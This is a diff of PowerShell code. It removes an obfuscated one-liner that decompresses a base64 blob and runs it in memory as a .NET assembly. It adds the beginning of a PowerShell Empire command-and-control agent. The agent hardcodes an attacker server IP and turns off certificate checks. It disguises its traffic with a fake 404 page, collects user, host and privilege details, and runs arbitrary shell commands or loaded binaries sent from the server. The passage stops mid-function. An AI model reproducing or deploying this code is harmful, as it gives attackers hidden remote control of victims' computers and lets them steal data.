@@ -1,1 +1,990 @@
-powershell  -Command "sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null"
+$Script:server = "http://139.180.171.110:22161";
+$Script:ControlServers = @($Script:server);
+$Script:ServerIndex = 0;
+if($server.StartsWith('https')){
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+}
+
+$Script:SendMessage = {
+    param($Packets)
+
+    if($Packets) {
+
+        $EncBytes = Encrypt-Bytes $Packets;
+
+
+
+        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
+
+        if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+
+            $wc = New-Object System.Net.WebClient;
+
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
+            $wc.Headers.Add('User-Agent', $Script:UserAgent);
+            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
+
+            try {
+
+                $taskURI = $Script:TaskURIs | Get-Random;
+                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+            }
+            catch [System.Net.WebException]{
+
+                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+
+                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
+                    }
+                }
+            }
+        }
+    };
+
+$Script:GetTask = {
+    try {
+        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+
+
+            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
+            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
+
+
+            $wc = New-Object System.Net.WebClient;
+
+
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
+            $wc.Headers.Add("User-Agent",$script:UserAgent);
+            $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};
+            $wc.Headers.Add("Cookie","session=$RoutingCookie");
+
+
+            $taskURI = $script:TaskURIs | Get-Random;
+            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);
+            $result;
+        }
+    }
+    catch [Net.WebException] {
+        $script:MissedCheckins += 1;
+        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+
+            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
+        }
+    }
+};
+function Invoke-Empire {
+    param(
+        [Parameter(Mandatory=$true)]
+        [String]
+        $StagingKey,
+        [Parameter(Mandatory=$true)]
+        [String]
+        $SessionKey,
+        [Parameter(Mandatory=$true)]
+        [String]
+        $SessionID,
+        [Int32]
+        $AgentDelay = 5,
+        [Double]
+        $AgentJitter = 0.0,
+        [String[]]
+        $Servers,
+        [String]
+        $KillDate,
+        [Int32]
+        $KillDays,
+        [String]
+        $WorkingHours,
+        [object]
+        $ProxySettings,
+        [String]
+        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        [Int32]
+        $LostLimit = 60,
+        [String]
+        $DefaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="
+    )
+    $Encoding = [System.Text.Encoding]::ASCII;
+    $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
+    $script:AgentDelay = $AgentDelay;
+    $script:AgentJitter = $AgentJitter;
+    $script:LostLimit = $LostLimit;
+    $script:MissedCheckins = 0;
+    $script:ResultIDs = @{};
+    $script:WorkingHours = $WorkingHours;
+    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse));
+    $script:Proxy = $ProxySettings;
+    $script:CurrentListenerName = "";
+    $Script:ServerIndex = 0;
+    $Script:ControlServers = $Servers;
+    $Retries = 1;
+    if($KillDays) {
+        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
+    }
+    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
+        $script:KillDate = $KillDate
+    }
+    $ProfileParts = $Profile.split('|');
+    $script:TaskURIs = $ProfileParts[0].split(',');
+    $script:UserAgent = $ProfileParts[1];
+    $script:SessionID = $SessionID;
+    $script:Headers = @{};
+    if($ProfileParts[2]) {
+        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
+            $Parts = $_.Split(':');
+            $script:Headers.Add($Parts[0],$Parts[1]);
+        }
+    }
+    $Script:Jobs = @{};
+    $Script:Downloads = @{};
+    $script:ImportedScript = '';
+    function ConvertTo-Rc4ByteStream {
+        Param ($In, $RCK)
+        begin {
+            [Byte[]] $S = 0..255;
+            $J = 0;
+            0..255 | ForEach-Object {
+                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $S[$_], $S[$J] = $S[$J], $S[$_];
+            };
+            $I = $J = 0;
+        }
+        process {
+            ForEach($Byte in $In) {
+                $I = ($I + 1) % 256;
+                $J = ($J + $S[$I]) % 256;
+                $S[$I], $S[$J] = $S[$J], $S[$I];
+                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
+            }
+        }
+    }
+    function Get-HexString {
+        param([byte]$Data)
+        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' ';
+    }
+    function Set-Delay {
+        param([int]$d, [double]$j=0.0)
+        $script:AgentDelay = $d;
+        $script:AgentJitter = $j;
+        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter";
+    }
+    function Get-Delay {
+        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter";
+    }
+    function Set-LostLimit {
+        param([int]$l)
+        $script:LostLimit = $l;
+        if($l -eq 0)
+        {
+            "agent set to never die based on checkin Limit";
+        }
+        else
+        {
+            "agent LostLimit set to $script:LostLimit";
+        }
+    }
+    function Get-LostLimit {
+        "agent LostLimit: $script:LostLimit";
+    }
+    function Set-Killdate {
+        param([string]$date)
+        $script:KillDate = $date;
+        "agent killdate set to $script:KillDate";
+    }
+    function Get-Killdate {
+        "agent killdate: $script:KillDate";
+    }
+    function Set-WorkingHours {
+        param([string]$hours)
+        $script:WorkingHours = $hours;
+        "agent working hours set to $($script:WorkingHours)";
+    }
+    function Get-WorkingHours {
+        "agent working hours: $($script:WorkingHours)";
+    }
+    function Get-Sysinfo {
+        $str = '0|';
+        $str += $Script:ControlServers[$Script:ServerIndex];
+        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
+        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
+        $str+="|$ip";
+        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+        if(([Environment]::UserName).ToLower() -eq 'system') {
+            $str += '|True';
+        }
+        else{
+            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator');
+        }
+        $n = [System.Diagnostics.Process]::GetCurrentProcess();
+        $str += '|'+$n.ProcessName+'|'+$n.Id;
+        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
+        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
+        $str;
+    }
+    function Invoke-ShellCommand {
+        param($cmd, $cmdargs="")
+        if ($cmdargs -like "*`"\\*") {
+            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\";
+        }
+        elseif ($cmdargs -like "*\\*") {
+            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\";
+        }
+        $output = '';
+        if ($cmd.ToLower() -eq 'shell') {
+            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
+            else {
+                $OldConsoleOut = [Console]::Out;
+                $StringWriter = New-Object IO.StringWriter;
+                [Console]::SetOut($StringWriter);
+                $output = iex "$cmdargs" | out-string;
+                [Console]::SetOut($OldConsoleOut);
+                if ($output.length -eq 0){
+                    $output = $StringWriter.ToString();
+                    }
+            }
+            $output += "`n`r";
+        }
+        elseif ($cmd.ToLower() -eq 'reflectiveload'){
+            if ($cmdargs.length -eq '') { $output = 'no binary supplied' };
+            else{
+                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs));
+                $output = "`n`r Reflective Load Complete";
+            }
+        }
+        else {
+            switch -regex ($cmd) {
+                '(ls|^dir)' {
+                    if ($cmdargs.length -eq "") {
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
+                    }
+                    else {
+                        try{
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
+                        }
+                        catch [System.Management.Automation.ActionPreferenceStopException] {
+                            $output = "[!] Error: $_ (or cannot be accessed).";
+                        }
+                    }
+                }
+                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
+                    if ($cmdargs.length -ne "") {
+                        try {
+                            IEX "$cmd $cmdargs -Force -ErrorAction Stop";
+                            $output = "executed $cmd $cmdargs";
+                        }
+                        catch {
+                            $output=$_.Exception;
+                        }
+                    }
+                }
+                cd {
+                    if ($cmdargs.length -ne '')
+                    {
+                        $cmdargs = $cmdargs.trim("`"").trim("'");
+                        cd "$cmdargs";
+                        $output = pwd;
+                    }
+                }
+                '(ipconfig|ifconfig)' {
+                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
+                        $out = New-Object psobject;
+                        $out | Add-Member Noteproperty 'Description' $_.Description;
+                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress;
+                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled;
+                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",");
+                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",");
+                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",");
+                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",");
+                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName;
+                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",");
+                        $out
+                    } | ConvertTo-Json;
+                }
+                '(ps|tasklist)' {
+                    $owners = @{};
+                    Get-WmiObject win32_process | ForEach-Object {
+                        try {
+                            $o = $_.getowner()
+                            if (-not $($o.User)) {
+                                $o = 'N/A'
+                            } else {
+                                $o = "$($o.Domain)\$($o.User)"
+                            }
+                        } catch {
+                            $o = 'N/A'
+                        }
+                        $owners[$_.handle] = $o
+                    }
+                    if($cmdargs -ne '') { $p = $cmdargs }
+                    else{ $p = "*" };
+                    $output = Get-Process $p | ForEach-Object {
+                        $arch = 'x64';
+                        if ([System.IntPtr]::Size -eq 4) {
+                            $arch = 'x86'
+                        }
+                        else{
+                            foreach($module in $_.modules) {
+                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
+                                    $arch = 'x86';
+                                    break
+                                }
+                            }
+                        }
+                        $out = New-Object psobject;
+                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
+                        $out | Add-Member Noteproperty 'PID' $_.ID;
+                        $out | Add-Member Noteproperty 'Arch' $arch;
+                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
+                        $mem = "{0:N2} MB" -f $($_.WS/1MB);
+                        $out | Add-Member Noteproperty 'MemUsage' $mem;
+                        $out;
+                    } | Sort-Object -Property PID | ConvertTo-Json;
+                }
+                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
+                route {
+                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
+                        $adapters = @{};
+                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress };
+                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
+                            $out = New-Object psobject;
+                            $out | Add-Member Noteproperty 'Destination' $_.Destination;
+                            $out | Add-Member Noteproperty 'Netmask' $_.Mask;
+                            if ($_.NextHop -eq "0.0.0.0") {
+                                $out | Add-Member Noteproperty 'NextHop' 'On-link';
+                            }
+                            else{
+                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop;
+                            }
+                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
